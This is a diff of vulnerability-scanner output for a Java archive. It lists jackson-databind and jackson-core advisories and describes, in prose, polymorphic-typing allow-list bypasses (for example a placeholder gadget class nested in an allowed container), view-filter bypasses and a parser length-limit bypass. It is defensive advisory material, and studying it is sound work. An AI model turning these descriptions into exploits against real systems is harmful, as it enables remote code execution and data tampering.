-                        │     │                   polymorphic typing is enabled and a type identifier contains
-                        │     │                   generic parameters (i.e. the type ID string contains <),
-                        │     │                   DatabindContext._resolveAndValidateGeneric() validates only
-                        │     │                   the raw container class name (the substring before <) against
-                        │     │                    the configured PTV. If the container type is approved, the
-                        │     │                   method parses the full canonical type string via
-                        │     │                   TypeFactory.constructFromCanonical() and returns the fully
-                        │     │                   parameterized type without ever validating the nested type
-                        │     │                   arguments against the PTV. The nested type arguments are then
-                        │     │                    resolved, instantiated, and populated as beans during
-                        │     │                   deserialization. An attacker who controls the type ID can
-                        │     │                   therefore place a denied class as a generic type parameter of
-                        │     │                    an allowed container — for example
-                        │     │                   java.util.ArrayList<com.evil.Gadget> when only
-                        │     │                   java.util.ArrayList is allow-listed. The container passes the
-                        │     │                    PTV check; com.evil.Gadget is loaded via Class.forName(name,
-                        │     │                    true, loader), instantiated, and its properties are set from
-                        │     │                    attacker-controlled JSON. This completely bypasses an
-                        │     │                   explicitly configured PTV allow-list. This vulnerability is
-                        │     │                   fixed in 2.18.8, 2.21.4, and 3.1.4. 
-                        │     ├ Severity        : HIGH 
-                        │     ├ CweIDs           ╭ [0]: CWE-184 
-                        │     │                  ╰ [1]: CWE-502 
-                        │     ├ VendorSeverity   ╭ ghsa  : 3 
-                        │     │                  ╰ redhat: 3 
-                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/
-                        │     │                  │        │           A:H 
-                        │     │                  │        ╰ V3Score : 8.1 
-                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/
-                        │     │                           │           A:H 
-                        │     │                           ╰ V3Score : 8.1 
-                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54512 
-                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/43
-                        │     │                  │      4d6c511de7fdd9872f29157aafb6162d12d8d5 
-                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5988 
-                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security/
-                        │     │                  │      advisories/GHSA-j3rv-43j4-c7qm 
-                        │     │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
-                        │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
-                        │     ├ PublishedDate   : 2026-06-23T21:17:02.203Z 
-                        │     ╰ LastModifiedDate: 2026-06-27T21:01:36.47Z 
-                        ├ [1] ╭ VulnerabilityID : CVE-2026-54513 
-                        │     ├ VendorIDs        ─ [0]: GHSA-rmj7-2vxq-3g9f 
-                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │     ├ PkgPath         : openaf/openaf.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                        │     │                  │       2.21.1 
-                        │     │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │     ├ InstalledVersion: 2.21.1 
-                        │     ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                        │     │                  │         a8305ba35c82bf9229f 
-                        │     │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                        │     │                            ea46f72dd8aa890c14b 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54513 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:2260021b06d899e0e5bfd23feeac3ada8f5825e01357e5a820eac7
-                        │     │                   d8bdb8f979 
-                        │     ├ Title           : jackson-databind: Jackson-databind: Security bypass allows
-                        │     │                   arbitrary code execution 
-                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │     │                   functionality and tree-model for Jackson Data Processor. From
-                        │     │                    2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
-                        │     │                   BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray()
-                        │     │                    allowlists any array type based only on clazz.isArray(),
-                        │     │                   without validating the array's component (element) type
-                        │     │                   against the configured allowlist. A PTV built with
-                        │     │                   allowIfSubTypeIsArray() plus an explicit concrete-type
-                        │     │                   allowlist therefore still permits EvilType[] even though
-                        │     │                   EvilType is not allowlisted. When Jackson deserializes the
-                        │     │                   elements and no per-element type IDs are present, it
-                        │     │                   instantiates the component type directly with no further PTV
-                        │     │                   check, bypassing the allowlist. This vulnerability is fixed
-                        │     │                   in 2.18.8, 2.21.4, and 3.1.4. 
-                        │     ├ Severity        : HIGH 
-                        │     ├ CweIDs           ─ [0]: CWE-184 
-                        │     ├ VendorSeverity   ╭ ghsa  : 3 
-                        │     │                  ╰ redhat: 3 
-                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/
-                        │     │                  │        │           A:H 
-                        │     │                  │        ╰ V3Score : 8.1 
-                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/
-                        │     │                           │           A:H 
-                        │     │                           ╰ V3Score : 8.1 
-                        │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:36839 
-                        │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:40895 
-                        │     │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2026-54513 
-                        │     │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
-                        │     │                  ├ [4] : https://github.com/FasterXML/jackson-databind 
-                        │     │                  ├ [5] : https://github.com/FasterXML/jackson-databind/commit/0
-                        │     │                  │       1d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5 
-                        │     │                  ├ [6] : https://github.com/FasterXML/jackson-databind/commit/2
-                        │     │                  │       4529da29fdf46ff94ca38de9ebf31cd188f5e8e 
-                        │     │                  ├ [7] : https://github.com/FasterXML/jackson-databind/issues/5
-                        │     │                  │       981 
-                        │     │                  ├ [8] : https://github.com/FasterXML/jackson-databind/issues/5
-                        │     │                  │       983 
-                        │     │                  ├ [9] : https://github.com/FasterXML/jackson-databind/pull/5984 
-                        │     │                  ├ [10]: https://github.com/FasterXML/jackson-databind/security
-                        │     │                  │       /advisories/GHSA-rmj7-2vxq-3g9f 
-                        │     │                  ├ [11]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
-                        │     │                  ├ [12]: https://security.access.redhat.com/data/csaf/v2/vex/20
-                        │     │                  │       26/cve-2026-54513.json 
-                        │     │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
-                        │     ├ PublishedDate   : 2026-06-23T21:17:02.333Z 
-                        │     ╰ LastModifiedDate: 2026-07-17T13:18:57.98Z 
-                        ├ [2] ╭ VulnerabilityID : CVE-2026-54514 
-                        │     ├ VendorIDs        ─ [0]: GHSA-hgj6-7826-r7m5 
-                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │     ├ PkgPath         : openaf/openaf.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                        │     │                  │       2.21.1 
-                        │     │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │     ├ InstalledVersion: 2.21.1 
-                        │     ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                        │     │                  │         a8305ba35c82bf9229f 
-                        │     │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                        │     │                            ea46f72dd8aa890c14b 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54514 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:2e2de016693bd8c7420c5ef2e52201d220f48c0fb8b837ba2586b1
-                        │     │                   10b02442cd 
-                        │     ├ Title           : jackson-databind: jackson-databind: Information Disclosure
-                        │     │                   via Eager DNS Resolution 
-                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │     │                   functionality and tree-model for Jackson Data Processor. From
-                        │     │                    2.0.0 until 2.18.8, 2.21.4, and 3.1.4,
-                        │     │                   JDKFromStringDeserializer constructed InetSocketAddress with
-                        │     │                   new InetSocketAddress(host, port), which performs eager DNS
-                        │     │                   name resolution for hostname inputs at deserialization time.
-                        │     │                   An application that binds untrusted JSON into a type
-                        │     │                   containing an InetSocketAddress field issues an
-                        │     │                   attacker-chosen DNS query during readValue, before any
-                        │     │                   application-level validation or connect logic. The fix uses
-                        │     │                   InetSocketAddress.createUnresolved(host, port), deferring DNS
-                        │     │                    to an explicit connect. This vulnerability is fixed in
-                        │     │                   2.18.8, 2.21.4, and 3.1.4. 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ CweIDs           ─ [0]: CWE-918 
-                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-                        │     │                  ╰ redhat: 2 
-                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/
-                        │     │                  │        │           A:N 
-                        │     │                  │        ╰ V3Score : 5.3 
-                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/
-                        │     │                           │           A:N 
-                        │     │                           ╰ V3Score : 5.3 
-                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54514 
-                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/1f
-                        │     │                  │      5a1037b1e9e05920e755cb35f198bcd46667e4 
-                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5951 
-                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security/
-                        │     │                  │      advisories/GHSA-hgj6-7826-r7m5 
-                        │     │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54514 
-                        │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54514 
-                        │     ├ PublishedDate   : 2026-06-23T21:17:02.467Z 
-                        │     ╰ LastModifiedDate: 2026-06-27T20:55:09.61Z 
-                        ├ [3] ╭ VulnerabilityID : CVE-2026-54515 
-                        │     ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
-                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │     ├ PkgPath         : openaf/openaf.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                        │     │                  │       2.21.1 
-                        │     │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │     ├ InstalledVersion: 2.21.1 
-                        │     ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                        │     │                  │         a8305ba35c82bf9229f 
-                        │     │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                        │     │                            ea46f72dd8aa890c14b 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:89b51cb6dc14e3c4f8dedf2b77a7573b36899313783809dd213888
-                        │     │                   f44c493eab 
-                        │     ├ Title           : jackson-databind: jackson-databind: Ignored properties can be
-                        │     │                    unexpectedly modified 
-                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │     │                   functionality and tree-model for Jackson Data Processor. From
-                        │     │                    2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
-                        │     │                   BeanDeserializerBase.createContextual(), per-property
-                        │     │                   @JsonIgnoreProperties exclusions are applied by
-                        │     │                   _handleByNameInclusion(), producing a contextual deserializer
-                        │     │                    whose BeanPropertyMap has the ignored properties removed.
-                        │     │                   The subsequent per-property case-insensitivity block
-                        │     │                   (triggered by
-                        │     │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
-                        │     │                   from this._beanProperties (the original, unfiltered map)
-                        │     │                   instead of contextual._beanProperties, then overwrites the
-                        │     │                   filtered map — restoring every property
-                        │     │                   _handleByNameInclusion had just removed. The ignored property
-                        │     │                    becomes writable again. This vulnerability is fixed in
-                        │     │                   2.18.9, 2.21.5, and 3.1.4. 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ CweIDs           ─ [0]: CWE-915 
-                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-                        │     │                  ╰ redhat: 2 
-                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-                        │     │                  │        │           A:N 
-                        │     │                  │        ╰ V3Score : 5.3 
-                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-                        │     │                           │           A:N 
-                        │     │                           ╰ V3Score : 5.3 
-                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
-                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0e
-                        │     │                  │      1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
-                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5962 
-                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5964 
-                        │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security/
-                        │     │                  │      advisories/GHSA-5jmj-h7xm-6q6v 
-                        │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
-                        │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
-                        │     ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
-                        │     ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
-                        ├ [4] ╭ VulnerabilityID : CVE-2026-54516 
-                        │     ├ VendorIDs        ─ [0]: GHSA-9fxm-vc8v-hj55 
-                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │     ├ PkgPath         : openaf/openaf.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                        │     │                  │       2.21.1 
-                        │     │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │     ├ InstalledVersion: 2.21.1 
-                        │     ├ FixedVersion    : 2.21.4, 3.1.4 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                        │     │                  │         a8305ba35c82bf9229f 
-                        │     │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                        │     │                            ea46f72dd8aa890c14b 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54516 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:8c2ff7109220cea4e0816237276fcc2cb6f1d1e3799057f4c4d0a2
-                        │     │                   5f907a51ef 
-                        │     ├ Title           : jackson-databind: jackson-databind: Security bypass due to
-                        │     │                   improper handling of renamed properties 
-                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │     │                   functionality and tree-model for Jackson Data Processor. From
-                        │     │                    2.21.0 until 2.21.4 and 3.1.4,
-                        │     │                   POJOPropertiesCollector._renameProperties() allows a property
-                        │     │                    with @JsonProperty("renamed") on the getter and @JsonIgnore
-                        │     │                   on the setter to be renamed rather than dropped. With
-                        │     │                   MapperFeature.INFER_PROPERTY_MUTATORS enabled (default), the
-                        │     │                   private backing field is retained; during deserialization
-                        │     │                   BeanDeserializerFactory.addBeanProps() sees hasField()==true,
-                        │     │                    builds a FieldProperty, and makes the backing field
-                        │     │                   writable. An attacker supplying the renamed JSON key writes
-                        │     │                   the backing field directly, bypassing the @JsonIgnore on the
-                        │     │                   setter. This vulnerability is fixed in 3.1.4. 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ CweIDs           ─ [0]: CWE-915 
-                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-                        │     │                  ╰ redhat: 2 
-                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-                        │     │                  │        │           A:N 
-                        │     │                  │        ╰ V3Score : 5.3 
-                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-                        │     │                           │           A:N 
-                        │     │                           ╰ V3Score : 5.3 
-                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54516 
-                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/c3
-                        │     │                  │      d56dd25d52319828147c5b9aeabf2d485c250a 
-                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/e8
-                        │     │                  │      8cb17006b6af4883b973058f0bb6486e5074af 
-                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5967 
-                        │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5968 
-                        │     │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security/
-                        │     │                  │      advisories/GHSA-9fxm-vc8v-hj55 
-                        │     │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54516 
-                        │     │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54516 
-                        │     ├ PublishedDate   : 2026-06-23T21:17:02.723Z 
-                        │     ╰ LastModifiedDate: 2026-06-27T20:52:12.103Z 
-                        ├ [5] ╭ VulnerabilityID : CVE-2026-54517 
-                        │     ├ VendorIDs        ─ [0]: GHSA-5hh8-q8hv-fr38 
-                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │     ├ PkgPath         : openaf/openaf.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                        │     │                  │       2.21.1 
-                        │     │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │     ├ InstalledVersion: 2.21.1 
-                        │     ├ FixedVersion    : 2.21.4, 3.1.4 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                        │     │                  │         a8305ba35c82bf9229f 
-                        │     │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                        │     │                            ea46f72dd8aa890c14b 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54517 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:a9efc7b66b15ffab54188d8ce09ca12cd118a2d4019490e68fb742
-                        │     │                   be5c9e925e 
-                        │     ├ Title           : jackson-databind: jackson-databind: Information disclosure
-                        │     │                   via improper JsonView filter application 
-                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │     │                   functionality and tree-model for Jackson Data Processor. From
-                        │     │                    2.21.0 until 2.21.4 and 3.1.4, in
-                        │     │                   BeanDeserializer._deserializeUsingPropertyBased, the
-                        │     │                   active-view (@JsonView) filter was applied only to creator
-                        │     │                   properties; the regular property-buffering branch performed
-                        │     │                   no prop.visibleInView(activeView) check. A change making
-                        │     │                   SetterlessProperty.isMerging() return true routed setterless
-                        │     │                   Collection/Map properties through this unguarded path, so a
-                        │     │                   setterless collection annotated with a restricted @JsonView
-                        │     │                   is populated from attacker JSON even when the active view
-                        │     │                   excludes it. This vulnerability is fixed in 2.21.4 and
-                        │     │                   3.1.4. 
-                        │     ├ Severity        : MEDIUM 
-                        │     ├ CweIDs           ─ [0]: CWE-863 
-                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-                        │     │                  ╰ redhat: 2 
-                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
-                        │     │                  │        │           A:N 
-                        │     │                  │        ╰ V3Score : 5.3 
-                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/
-                        │     │                           │           A:N 
-                        │     │                           ╰ V3Score : 5.3 
-                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54517 
-                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/5b
-                        │     │                  │      f23edb4221f7dd2ec8e71ff6d26c61640f261d 
-                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/94
-                        │     │                  │      c5d215b3af1505098c686405d9641f041a9962 
-                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5969 
-                        │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5970 
-                        │     │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security/
-                        │     │                  │      advisories/GHSA-5hh8-q8hv-fr38 
-                        │     │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54517 
-                        │     │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54517 
-                        │     ├ PublishedDate   : 2026-06-23T21:17:02.853Z 
-                        │     ╰ LastModifiedDate: 2026-06-27T20:51:09.987Z 
-                        ╰ [6] ╭ VulnerabilityID : CVE-2026-54518 
-                              ├ VendorIDs        ─ [0]: GHSA-rcqc-6cw3-h962 
-                              ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                              ├ PkgPath         : openaf/openaf.jar 
-                              ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                              │                  │       2.21.1 
-                              │                  ╰ UID : 6bd66f14c6cb3d57 
-                              ├ InstalledVersion: 2.21.1 
-                              ├ FixedVersion    : 2.21.4 
-                              ├ Status          : fixed 
-                              ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                              │                  │         a8305ba35c82bf9229f 
-                              │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                              │                            ea46f72dd8aa890c14b 
-                              ├ SeveritySource  : ghsa 
-                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54518 
-                              ├ DataSource       ╭ ID  : ghsa 
-                              │                  ├ Name: GitHub Security Advisory Maven 
-                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                              │                          osystem%3Amaven 
-                              ├ Fingerprint     : sha256:b632916ae0a64bc024e3a193ec1b247e856d56347c4bfbcbbffdce
-                              │                   40b2d46973 
-                              ├ Title           : jackson-databind: jackson-databind: Information disclosure
-                              │                   and data manipulation via view-based access control bypass 
-                              ├ Description     : jackson-databind contains the general-purpose data-binding
-                              │                   functionality and tree-model for Jackson Data Processor. From
-                              │                    2.21.0 until 2.21.4 and 3.1.4,
-                              │                   UnwrappedPropertyHandler.processUnwrappedCreatorProperties()
-                              │                   replays buffered JSON into creator parameters but never
-                              │                   consults prop.visibleInView(activeView). The normal
-                              │                   property-based creator path gates creator properties on the
-                              │                   active view, but this unwrapped-creator replay path bypasses
-                              │                   that check, so a constructor parameter annotated with both
-                              │                   @JsonView(AdminView.class) and @JsonUnwrapped is populated
-                              │                   from attacker JSON even when a more restrictive view is
-                              │                   active. This vulnerability is fixed in 2.21.4 and 3.1.4. 
-                              ├ Severity        : MEDIUM 
-                              ├ CweIDs           ─ [0]: CWE-863 
-                              ├ VendorSeverity   ╭ ghsa  : 2 
-                              │                  ╰ redhat: 2 
-                              ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/
-                              │                  │        │           A:N 
-                              │                  │        ╰ V3Score : 6.5 
-                              │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/
-                              │                           │           A:N 
-                              │                           ╰ V3Score : 6.5 
-                              ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54518 
-                              │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-                              │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/72
-                              │                  │      1fa07ebbd4aab4a659a1a68940878315c3e341 
-                              │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/d6
-                              │                  │      33bc038f200c1397c07f1a2b46f58e72c91eea 
-                              │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5971 
-                              │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5973 
-                              │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security/
-                              │                  │      advisories/GHSA-rcqc-6cw3-h962 
-                              │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54518 
-                              │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54518 
-                              ├ PublishedDate   : 2026-06-23T22:16:32.073Z 
-                              ╰ LastModifiedDate: 2026-06-27T20:49:30.977Z 
+      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.2
+                        │      │                  │       1.1 
+                        │      │                  ╰ UID : e7f3a221af06f63e 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:8eb56afce8819c673bf460077c7a3fb66a3c2de2067374191337b
+                        │      │                   7361383d2df 
+                        │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via
+                        │      │                   chunked digit accumulation (incomplete fix for
+                        │      │                   GHSA-72hv-8253-57qq) 
+                        │      ├ Description     : ## Summary
+                        │      │                   
+                        │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
+                        │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-c
+                        │      │                   ore/security/advisories/GHSA-72hv-8253-57qq) (Number Length
+                        │      │                   Constraint Bypass in Async Parser, published 2026-02-28) is
+                        │      │                   incomplete. The fix commit `b0c428e6` (#1555) wired
+                        │      │                   `validateIntegerLength` into a new `_setIntLength` helper
+                        │      │                   and called it at every place where the integer portion of a
+                        │      │                   number is *decided* (terminator byte arrived, `.` / `e/E`
+                        │      │                   seen, end-of-feed inside a fully-buffered value). It did not
+                        │      │                    call it on the much more attacker-relevant path: "ran out
+                        │      │                   of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`,
+                        │      │                   return `NOT_AVAILABLE` to caller".
+                        │      │                   As a result, an attacker who streams JSON to a non-blocking
+                        │      │                   parser in many small chunks, without ever sending a
+                        │      │                   terminator byte, can keep the parser inside
+                        │      │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
+                        │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
+                        │      │                   and `validateIntegerLength` is never invoked. The
+                        │      │                   accumulator is only gated by `maxStringLength` (20 MiB
+                        │      │                   default) — a **~20,000x amplification** of the documented
+                        │      │                   `maxNumberLength` (1000 default).
